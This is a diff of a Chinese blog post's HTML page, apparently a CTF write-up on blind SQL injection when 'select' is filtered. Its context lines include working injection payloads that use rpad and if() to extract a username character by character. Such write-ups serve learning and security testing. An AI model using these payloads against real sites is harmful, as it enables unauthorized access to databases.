@@ -5,17 +5,16 @@
   
   <title>不使用select情况下的各种盲注 | Hc1m1</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description">
+  <meta name="description" content="这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..">
 <meta property="og:type" content="article">
 <meta property="og:title" content="不使用select情况下的各种盲注">
 <meta property="og:url" content="http://0x48.pw/2015/10/05/0x09/index.html">
 <meta property="og:site_name" content="Hc1m1">
-<meta property="og:description">
-<meta property="og:image" content="http://0x48.pw/img/sqli.jpg">
-<meta property="og:updated_time" content="2015-10-15T01:09:09.824Z">
+<meta property="og:description" content="这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..">
+<meta property="og:updated_time" content="2016-03-28T10:22:39.150Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="不使用select情况下的各种盲注">
-<meta name="twitter:description">
+<meta name="twitter:description" content="这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..">
   
     <link rel="alternative" href="/atom.xml" title="Hc1m1" type="application/atom+xml">
   
@@ -303,7 +302,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p><img src="/img/sqli.jpg" alt="SQLI"><br><a id="more"></a><br>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
+        <blockquote>
+<p>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
+</blockquote>
+<a id="more"></a>
 <p>原本我以为, 在select被过滤的情况下, 如果不能bypass, 就没法注入… 而这次看了writeup后, 不同的队, 姿势都不同, 大开眼界….</p>
 <p>这次题目的语句我猜测是 <code>select pic from table where ID=&quot;$i&quot;;</code><br>$i 则是可控点..</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload 0x0:</span><br><span class="line">    $i = 1" &amp;&amp; username="%</span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> talbe <span class="keyword">where</span> ID=<span class="string">"1"</span> &amp;&amp; username=<span class="string">"%"</span></span><br><span class="line">这个payload可以用来猜测是否有该字段, 接下来的盲注这语句仍然可用</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x1</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR if(rpad(username,1,1)="</span>a<span class="string">",1,0)#  或者 111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">101</span>),<span class="number">1</span>,<span class="number">0</span>)# </span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">"a"</span>,<span class="number">1</span>,<span class="number">0</span>)#<span class="string">"</span><br><span class="line">在知道该表有username字段后, 可以通过这语句进行盲注</span></span></span><br></pre></td></tr></table></figure>
@@ -321,7 +323,7 @@
         <p><span>本文标题:</span><a href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
         <p><span>发布时间:</span>2015-10-05, 11:17:10</p>
-        <p><span>最后更新:</span>2015-10-15, 09:09:09</p>
+        <p><span>最后更新:</span>2016-03-28, 18:22:39</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2015/10/05/0x09/" title="不使用select情况下的各种盲注">http://0x48.pw/2015/10/05/0x09/</a>
             <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2015/10/05/0x09/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
